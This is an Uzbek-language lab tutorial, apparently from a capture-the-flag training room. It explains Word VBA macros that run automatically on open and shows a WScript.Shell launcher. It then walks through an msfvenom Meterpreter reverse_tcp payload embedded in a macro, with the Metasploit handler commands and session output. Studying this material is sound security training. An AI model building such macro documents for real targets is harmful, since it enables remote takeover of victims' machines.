
**Visual Basic for Application (VBA)**

VBA — bu *Visual Basic for Applications* (Ilovalar uchun Visual Basic) degan so‘zlarning qisqartmasi bo‘lib, Microsoft tomonidan Microsoft Word, Excel, PowerPoint va boshqa dasturlarga joriy qilingan dasturlash tili. VBA dasturlash Microsoft Office dasturlarida klaviatura va sichqoncha orqali bajariladigan deyarli barcha ishlarni avtomatlashtirish imkonini beradi.

**Makroslar** — bu Microsoft Office hujjatlarida joylashgan, Visual Basic for Applications (VBA) tilida yozilgan kod bo‘lib, qo‘lda bajariladigan ishlarni tezlashtirish uchun maxsus funksiyalar yaratadi. VBA’ning imkoniyatlaridan biri — Windows Application Programming Interface (API) va boshqa past darajadagi funksiyalarga kirishdir. VBA haqida batafsil ma’lumot olish uchun *bu yerni* oching.

Ushbu vazifada biz VBA asoslarini va qanday qilib dushman makroslardan foydalanib zararli Microsoft hujjatlarini yaratishini muhokama qilamiz. Ushbu vazifa mazmuniga amal qilish uchun 2-topshiriqda biriktirilgan Windows mashinasini ishga tushiring. Tayyor bo‘lgach, uni brauzer orqali ochishingiz mumkin bo‘ladi.

---

**Microsoft Word 2016’ni ochish**

1. *Start* menyusidan Microsoft Word 2016’ni ishga tushiring.
2. Mahsulot kaliti oynasini yopamiz, chunki biz uni 7 kunlik sinov muddatida ishlatamiz.
3. Microsoft Office litsenziya shartnomasini qabul qilamiz.

Keyin yangi bo‘sh Microsoft hujjatini yarating va birinchi makrosimizni yozamiz. Maqsad — VBA tilining asoslarini tushuntirish va hujjat ochilganda uni avtomatik ishlatishni ko‘rsatish.

**Makros yaratish**

1. *View → Macros* bo‘limiga o‘ting.
2. *Macro name* qismida makros nomini **THM** deb qo‘ying.
3. *Macros in* ro‘yxatida **Document1** tanlang va **Create** tugmasini bosing.
4. Microsoft Visual Basic for Applications muharriri ochiladi.

Oddiy xabar oynasi ko‘rsatish uchun quyidagi kodni yozamiz:

```vba
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

**Makrosni ishga tushirish**: `F5` tugmasini bosing yoki *Run → Run Sub/UserForm* menyusidan foydalaning.

---

**Hujjat ochilganda avtomatik ishga tushirish**
VBA’da `AutoOpen` va `Document_Open` kabi funksiyalar mavjud bo‘lib, ular hujjat ochilganda avtomatik ishlaydi. Bizning holatda `THM` funksiyasini chaqiramiz:

```vba
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Makros ishlashi uchun hujjatni *makrosga ruxsat berilgan format*da saqlash kerak, masalan `.doc` yoki `.docm`. Biz uni **Word 97-2003 Document** formatida saqlaymiz (*File → Save as type → Word 97-2003 Document*).

Hujjatni qayta ochganda Microsoft Word xavfsizlik xabarini chiqaradi — **Enable Content** tugmasini bosamiz. Makros ishga tushadi.

---

**Calc.exe’ni ishga tushirish uchun makros**

Quyidagi makros Windows kalkulyatorini ishga tushirish misoli:

```vba
Sub PoC()
    Dim payload As String
    payload = "calc.exe"
    CreateObject("Wscript.Shell").Run payload,0
End Sub
```

**Izoh**:

* `Dim payload As String` — `payload` nomli o‘zgaruvchini matn turi sifatida e’lon qiladi.
* `payload = "calc.exe"` — bajariladigan fayl nomini belgilaydi.
* `CreateObject("Wscript.Shell").Run payload` — Windows Scripting Host (WSH) obyektini yaratadi va faylni ishga tushiradi.

Agar funksiyaning nomini o‘zgartirsangiz, `AutoOpen()` va `Document_Open()` ichida ham o‘zgartirishingiz kerak.

---

**Makros + Metasploit yordamida Meterpreter teskari shell olish**

1. **Msfvenom yordamida payload yaratish**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
```

* `LHOST` — hujumchi mashinasining IP-manzili (sizning AttackBox IP’ingiz).
* `LPORT` — tinglash porti.

Natijada VBA formatidagi kod hosil bo‘ladi. Excel uchun ishlatiladigan `Workbook_Open()` funksiyasini Word uchun `Document_Open()` ga almashtiramiz.

2. **Metasploit listener ishga tushirish**

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.50.159.15
set LPORT 443
exploit
```

3. **Jabrlanuvchi hujjatni ochganda**
   Metasploit quyidagicha javob qaytaradi:

```
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209)
meterpreter >
```

Natijada siz teskari Meterpreter shell olasiz.
